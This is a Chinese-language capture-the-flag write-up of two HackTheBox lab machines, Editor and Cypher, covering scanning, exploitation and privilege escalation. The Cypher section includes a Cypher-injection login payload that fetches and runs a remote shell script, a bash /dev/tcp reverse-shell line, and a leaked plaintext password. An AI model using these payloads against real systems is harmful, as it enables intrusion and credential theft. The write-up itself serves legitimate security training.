---
title: HTB Editor&Cypher
published: 2025-08-12
pinned: false
description: HTB Editor&Cypher，渗透，wp
tags: ['HTB']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-08-12
pubDate: 2025-08-12
---


# Editor

## 外网打点

`rustscan`不知道为什么扫不出来8080，感觉被资本做局了

```
nmap -sC -sV -Pn -p- 10.10.11.80 --min-rate=5000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-05 13:06 CST
Nmap scan report for 10.10.11.80
Host is up (0.11s latency).
Not shown: 52865 filtered tcp ports (no-response), 12667 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.22 seconds

```

先把域名加进去，然后访问80发现什么都没有bro，看看8080，发现了`xwiki`这个词
直接在网上搜一下，找到[CVE](https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC/blob/main/CVE-2025-24893-dbs.py)

## 内网

### 切换用户

进去之后看见了一堆数据库文件，且本地有mysql，第一想法是找到数据库密码，数据库里面估计有其他的账号信息

尝试之后无果，只得到了一个可以登陆数据库的密码`theEd1t0rTeam99`

然后突发奇想bro，`cat /etc/passwd`看见了一堆用户，直接一个一个试，当然了`hydra`可以快速喷洒，这里可以用`oliver`这个用户登陆上去

### 提权

进去之后`id`看看，结果发现`netdata`，网上搜一下[cve](https://cve.imfht.com/detail/CVE-2024-32019)，找到cve了xd，直接打就行了，非常的简单

值得注意的是，靶机是x86的，我mac的arm直接废掉了，我哭死

# Cypher

## 外网打点

```
nmap  -sC -sV -Pn 10.10.11.57                                                                                                                  ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 10:52 CST
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 10:53 (0:00:00 remaining)
Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 10:54 (0:00:00 remaining)
Nmap scan report for 10.10.11.57
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.02 seconds

dirsearch -u http://cypher.htb/                                                                  ─╯
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/zsm/reports/http_cypher.htb/__25-03-30_10-57-11.txt

Target: http://cypher.htb/
[10:57:11] Starting:
[10:57:23] 200 -    5KB - /about
[10:57:23] 200 -    5KB - /about.html
[10:57:31] 404 -   22B  - /api.log
[10:57:31] 404 -   22B  - /api-docs
[10:57:31] 307 -    0B  - /api/  ->  http://cypher.htb/api/api
[10:57:31] 404 -   22B  - /api/2/explore/
[10:57:31] 307 -    0B  - /api  ->  /api/docs
[10:57:31] 404 -   22B  - /api-doc
[10:57:31] 404 -   22B  - /api.py
[10:57:31] 404 -   22B  - /api/batch
[10:57:31] 404 -   22B  - /api.php
[10:57:31] 404 -   22B  - /api/__swagger__/
[10:57:31] 404 -   22B  - /api/2/issue/createmeta
[10:57:31] 404 -   22B  - /api/cask/graphql
[10:57:31] 404 -   22B  - /api/_swagger_/
[10:57:31] 404 -   22B  - /api/api
[10:57:31] 404 -   22B  - /api/api-docs
[10:57:32] 404 -   22B  - /api/apidocs/swagger.json
[10:57:32] 404 -   22B  - /api/docs
[10:57:32] 404 -   22B  - /api/application.wadl
[10:57:32] 404 -   22B  - /api/apidocs
[10:57:32] 404 -   22B  - /api/docs/
[10:57:32] 404 -   22B  - /api/config
[10:57:32] 404 -   22B  - /api/jsonws
[10:57:32] 404 -   22B  - /api/snapshots
[10:57:32] 404 -   22B  - /api/profile
[10:57:32] 404 -   22B  - /api/error_log
[10:57:32] 404 -   22B  - /api/swagger
[10:57:32] 404 -   22B  - /api/login.json
[10:57:32] 404 -   22B  - /api/jsonws/invoke
[10:57:32] 404 -   22B  - /api/proxy
[10:57:32] 404 -   22B  - /api/package_search/v4/documentation
[10:57:32] 404 -   22B  - /api/spec/swagger.json
[10:57:32] 404 -   22B  - /api/swagger.yaml
[10:57:32] 404 -   22B  - /api/swagger.json
[10:57:32] 404 -   22B  - /api/swagger/ui/index
[10:57:32] 404 -   22B  - /api/v1/swagger.json
[10:57:32] 404 -   22B  - /api/swagger/swagger
[10:57:32] 404 -   22B  - /api/swagger.yml
[10:57:32] 404 -   22B  - /api/v1/
[10:57:32] 404 -   22B  - /api/timelion/run
[10:57:32] 404 -   22B  - /api/v1
[10:57:32] 404 -   22B  - /api/v2
[10:57:32] 404 -   22B  - /api/v1/swagger.yaml
[10:57:32] 404 -   22B  - /api/v2/
[10:57:32] 404 -   22B  - /api/v2/swagger.json
[10:57:32] 404 -   22B  - /api/v2/helpdesk/discover
[10:57:32] 404 -   22B  - /api/v2/swagger.yaml
[10:57:32] 404 -   22B  - /api/whoami
[10:57:32] 404 -   22B  - /apibuild.pyc
[10:57:32] 404 -   22B  - /api/v3
[10:57:32] 404 -   22B  - /apidoc
[10:57:32] 404 -   22B  - /api/v4
[10:57:32] 404 -   22B  - /apiserver-key.pem
[10:57:32] 404 -   22B  - /api/vendor/phpunit/phpunit/phpunit
[10:57:32] 404 -   22B  - /apiserver-client.crt
[10:57:32] 404 -   22B  - /apiserver-aggregator-ca.cert
[10:57:32] 404 -   22B  - /apiserver-aggregator.cert
[10:57:32] 404 -   22B  - /apis
[10:57:32] 404 -   22B  - /apidocs
[10:57:32] 404 -   22B  - /api/version
[10:57:32] 404 -   22B  - /apiserver-aggregator.key
[10:57:41] 307 -    0B  - /demo  ->  /login
[10:57:41] 404 -   22B  - /demo.php
[10:57:41] 404 -   22B  - /demo.aspx
[10:57:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo
[10:57:42] 404 -   22B  - /demo.jsp
[10:57:42] 404 -   22B  - /demo.js
[10:57:42] 404 -   22B  - /demo/sql/index.jsp
[10:57:42] 404 -   22B  - /demos/
[10:57:42] 404 -   22B  - /demo/ojspext/events/globals.jsa
[10:57:42] 404 -   22B  - /demoadmin
[10:57:52] 200 -    4KB - /login
[10:57:52] 200 -    4KB - /login.html
[10:58:08] 301 -  178B  - /testing  ->  http://cypher.htb/testing/
```

http://cypher.htb/testing/ 下面有个jar包，反编译他
login尝试sql注入，虽然报错，但是无果

```java
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */
public class CustomFunctions {
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
    @Description("Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
            url = "https://" + url;
        }
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while (true) {
            String line = errorReader.readLine();
            if (line == null) {
                break;
            }
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
        if (!exited) {
            process.destroyForcibly();
            statusCode = "0";
            System.err.println("Process timed out after 10 seconds");
        } else {
            int exitCode = process.exitValue();
            if (exitCode != 0) {
                statusCode = "0";
                System.err.println("Process exited with code " + exitCode);
            }
        }
        if (errorOutput.length() > 0) {
            System.err.println("Error output:\n" + errorOutput.toString());
        }
        return Stream.of(new StringOutput(statusCode));
    }

    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */
    public static class StringOutput {
        public String statusCode;

        public StringOutput(String statusCode) {
            this.statusCode = statusCode;
        }
    }
}
```
```
{
  "username": "admin' return h.value AS value  UNION CALL custom.getUrlStatusCode(\"127.0.0.1;curl 10.10.16.4:8000/shell.sh|bash;\") YIELD statusCode AS value  RETURN value ; //",                                                                                                                                                  
  "password": "123"
}

bash -i >& /dev/tcp/10.10.16.4/4444 0>&1
```
```
neo4j@cypher:/$ id
id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
neo4j@cypher:/$ cd /home
cd /home
neo4j@cypher:/home$ ls
ls
graphasm
neo4j@cypher:/home$ cd g
cd g
bash: cd: g: No such file or directory
neo4j@cypher:/home$ cd graphasm
cd graphasm
neo4j@cypher:/home/graphasm$ ls
ls
bbot_preset.yml
bbot_scans
my_modules
user.txt

neo4j@cypher:/home/graphasm$ cat bb*
cat bb*
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

module_dirs:
  - /home/graphasm/my_modules
```

拿到账号密码,ssh上去

## 内网提权

```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
graphasm@cypher:~$ cat  /usr/local/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

graphasm@cypher:/usr/local/bin$ sudo /usr/local/bin/bbot -cy /root/root.txt --debug
直接增加规则，然后调试，形成读取文件的情况

